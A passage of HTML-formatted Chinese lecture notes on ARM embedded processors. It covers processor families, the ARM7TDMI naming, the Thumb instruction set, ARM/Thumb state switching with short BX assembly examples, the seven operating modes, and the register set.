Roman";'>系列，</span><span lang="EN-US"><span style="font-family: Times New Roman;"> ARM9E</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>系列，</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM10E</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>系列，</span><span lang="EN-US"><span style="font-family: Times New Roman;"> SecurCore</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>系列，</span><span lang="EN-US"><span style="font-family: Times New Roman;">Cortex</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>系列，</span><span lang="EN-US"><span style="font-family: Times New Roman;"> Intel</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的</span><span lang="EN-US"><span style="font-family: Times New Roman;">strong ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>和</span><span lang="EN-US"><span style="font-family: Times New Roman;">Xscale</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>系列，其中，</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM7</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM9</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM9E</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>和</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM10</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>为</span><span lang="EN-US"><span style="font-family: Times New Roman;">4</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>个通用处理器系列，每一个系列提供一套相对独特的性能来满足不同应用领域的需求。</span><span lang="EN-US"><span style="font-family: Times New Roman;">SecurCore</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>系列专门为安全要求较高的应用而设计。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">ARM7TDMI</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>含义</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">T</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：支持</span><span lang="EN-US"><span style="font-family: Times New Roman;">16</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位压缩指令集</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>；</span><span lang="EN-US"><span style="font-family: Times New Roman;">D</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：支持片上</span><span lang="EN-US"><span style="font-family: Times New Roman;">Debug</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>；</span><span lang="EN-US"><span style="font-family: Times New Roman;">M</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：内嵌硬件乘法器（</span><span lang="EN-US"><span style="font-family: Times New Roman;">Multiplier</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）</span><span lang="EN-US"><span style="font-family: Times New Roman;">I</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：嵌入式</span><span lang="EN-US"><span style="font-family: Times New Roman;">ICE</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>硬件，支持片上断点和调试点；</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>技术产生的原因或特点</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：<span style="color: red;">原因</span>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>高端消费类产品需要</span><span lang="EN-US"><span style="font-family: Times New Roman;">32</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>处理器性能和更优于</span><span lang="EN-US"><span style="font-family: Times New Roman;">16</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位的</span><span lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>处理器的代码密度。这就要求要以更低的成本取得更好的性能和更优于</span><span lang="EN-US"><span style="font-family: Times New Roman;">16</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位的</span><span lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>处理器的代码密度。</span><span lang="EN-US"><span style="font-family: Times New Roman;">2. </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>为了满足嵌入式技术不断发展的要求，</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>体系结构的发展中已经提供了低功耗、小体积、高性能的方案。同时为了解决代码长度的问题，</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>体系结构又增加了Ｔ变种，开发了一种新的指令体系，这就是</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>指令集。<span style="color: red;">特点</span>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>支持</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的核有</span><span lang="EN-US"><span style="font-family: Times New Roman;">2</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>套独立的指令集，它使设计者得到</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM32</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位指令的性能，又能享有</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>指令集产生的代码方面的优势。可以在性能和代码大小之间取得平衡；</span><span lang="EN-US"><span style="font-family: Times New Roman;">2. </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>在需要较低的存储代码时采用</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>指令系统，但有比纯粹</span><span lang="EN-US"><span style="font-family: Times New Roman;">16</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位系统高的实现性能，因为实际执行的是</span><span lang="EN-US"><span style="font-family: Times New Roman;">32</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位指令，用</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>指令编写最小代码量的程序，却取得以</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>代码执行的最好性能；</span><span lang="EN-US"><span style="font-family: Times New Roman;">3. </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>独立的两套指令集也使得解码逻辑极其的简单，从而维持了较小的硅片面积，保证了领先的“低功耗、高性能、小体积”的技术要求，满足了对嵌入式系统的设计需求。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'><span style="font-size: small;">第五讲</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>和</span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">THUMB</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的切换方法</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：进入</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态</span><span lang="EN-US"><span style="font-family: Times New Roman;">: 1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>当操作数寄存器</span><span lang="EN-US"><span style="font-family: Times New Roman;">Rm</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的状态位</span><span lang="EN-US"><span style="font-family: Times New Roman;">bit</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>［</span><span lang="EN-US"><span style="font-family: Times New Roman;">0</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>］为</span><span lang="EN-US"><span style="font-family: Times New Roman;">1</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>时，执行</span><span lang="EN-US"><span style="font-family: Times New Roman;"> BX Rm </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>指令进入</span><span lang="EN-US"><span style="font-family: Times New Roman;"> Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态（指令详细介绍见后面）。</span><span lang="EN-US"><span style="font-family: Times New Roman;">2. </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>所有的异常都是在</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态下进行，如果处理器在</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态进入异常，则当异常处理（</span><span lang="EN-US"><span style="font-family: Times New Roman;">IRQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，</span><span lang="EN-US"><span style="font-family: Times New Roman;">FIQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，</span><span lang="EN-US"><span style="font-family: Times New Roman;">Undef</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，</span><span lang="EN-US"><span style="font-family: Times New Roman;">Abort</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>和</span><span lang="EN-US"><span style="font-family: Times New Roman;">SWI</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）返回时，自动切换到</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态。进入</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态</span><span lang="EN-US"><span style="font-family: Times New Roman;">: 1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>当操作数寄存器</span><span lang="EN-US"><span style="font-family: Times New Roman;">Rm</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的状态位</span><span lang="EN-US"><span style="font-family: Times New Roman;">bit</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>［</span><span lang="EN-US"><span style="font-family: Times New Roman;">0</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>］为</span><span lang="EN-US"><span style="font-family: Times New Roman;">0</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>时，执行</span><span lang="EN-US"><span style="font-family: Times New Roman;"> BX Rm </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>指令进入</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态。</span><span lang="EN-US"><span style="font-family: Times New Roman;">2. </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>如果处理器进行异常处理（</span><span lang="EN-US"><span style="font-family: Times New Roman;">IRQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，</span><span lang="EN-US"><span style="font-family: Times New Roman;">FIQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，</span><span lang="EN-US"><span style="font-family: Times New Roman;">Undef</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，</span><span lang="EN-US"><span style="font-family: Times New Roman;">Abort</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>和</span><span lang="EN-US"><span style="font-family: Times New Roman;">SWI</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>），在此情况下，把</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>放入异常模式链接寄存器</span><span lang="EN-US"><span style="font-family: Times New Roman;">LR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中，从异常向量地址开始执行也可以进入</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>从</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态切换到</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态：</span><span lang="EN-US"><span style="font-family: Times New Roman;">LDR<span style="mso-spacerun: yes;">    </span>R0,=Label+1<span style="mso-spacerun: yes;">  </span>BX<span style="mso-spacerun: yes;">       </span>R0</span></span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>从</span><span lang="EN-US"><span style="font-family: Times New Roman;">Thumb</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态切换到</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态：</span><span lang="EN-US"><span style="font-family: Times New Roman;">LDR<span style="mso-spacerun: yes;">   </span>R0,=Label<span style="mso-spacerun: yes;">     </span>BX<span style="mso-spacerun: yes;">      </span>R0</span></span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">ARM </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>有</span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">7</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>个基本工作模式</span><span lang="EN-US"><span style="font-family: Times New Roman;">: 1.User:</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>非特权模式，大部分任务执行在这种模式，正常程序执行的模式</span><span lang="EN-US"><span style="font-family: Times New Roman;">2. FIQ:</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>当一个高优先级</span><span lang="EN-US"><span style="font-family: Times New Roman;">(fast)</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中断产生时将会进入这种模式，高速数据传输和通道处理</span><span lang="EN-US"><span style="font-family: Times New Roman;">3.IRQ:</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>当一个低优先级</span><span lang="EN-US"><span style="font-family: Times New Roman;">(normal)</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中断产生时将会进入这种模式，通常的中断处理</span><span lang="EN-US"><span style="font-family: Times New Roman;">4.Supervisor:</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>当复位或软中断指令执行时将会进入这种模式，供操作系统使用的一种保护模式</span><span lang="EN-US"><span style="font-family: Times New Roman;">5. Abort: </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>当存取异常时将会进入这种模式，虚拟存储及存储保护</span><span lang="EN-US"><span style="font-family: Times New Roman;">6. Undef: </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>当执行未定义指令时会进入这种模式，软件仿真硬件协处理器</span><span lang="EN-US"><span style="font-family: Times New Roman;">7.System: </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>使用和</span><span lang="EN-US"><span style="font-family: Times New Roman;">User</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>模式相同寄存器集的特权模式，特权级的操作系统任务</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寄存器</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>处理器总共有</span><span lang="EN-US"><span style="font-family: Times New Roman;">37</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>个寄存器，这</span><span lang="EN-US"><span style="font-family: Times New Roman;">37</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>个寄存器按它在用户编程中的功能划分，可以分为以下两类寄存器：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）</span><span lang="EN-US"><span style="font-family: Times New Roman;">31</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>个通用寄存器，包括了程序计数器（</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>这些寄存器都是</span><span lang="EN-US"><span style="font-family: Times New Roman;">32</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位的。</span><span lang="EN-US"><span style="font-family: Times New Roman;"><span style="mso-tab-count: 1;"> </span>R0~R15</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">R13_svc</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New 